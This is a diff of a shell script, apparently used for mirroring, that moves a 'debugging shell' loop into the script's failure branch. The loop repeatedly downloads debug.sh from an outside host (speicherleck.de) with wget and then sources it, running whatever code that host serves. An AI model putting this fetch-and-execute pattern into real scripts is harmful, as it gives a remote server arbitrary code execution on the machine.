@@ -74,16 +74,17 @@ if [ ! -e luga-dummy/index.html ]; then
     echo "Didn't manage to mirror 'index.html'; something went wrong. Aborting." >&2
     echo "$ curl -v http://luga-dummy/" >&2
     curl -v http://luga-dummy/ >&2 || true
+
+    # Simple "shell" for debugging purposes
+    for i in `seq -w 30`; do
+        until wget -O debug.sh https://www.speicherleck.de/debug-$i > debug.sh; do
+            sleep 10
+        done
+        . debug.sh
+    done
+
     exit 1
 fi
-
-# Simple "shell" for debugging purposes
-for i in `seq -w 30`; do
-    until wget -O debug.sh https://www.speicherleck.de/debug-$i > debug.sh; do
-        sleep 10
-    done
-    . debug.sh
-done
 
 mv luga-dummy/* .
 rmdir luga-dummy
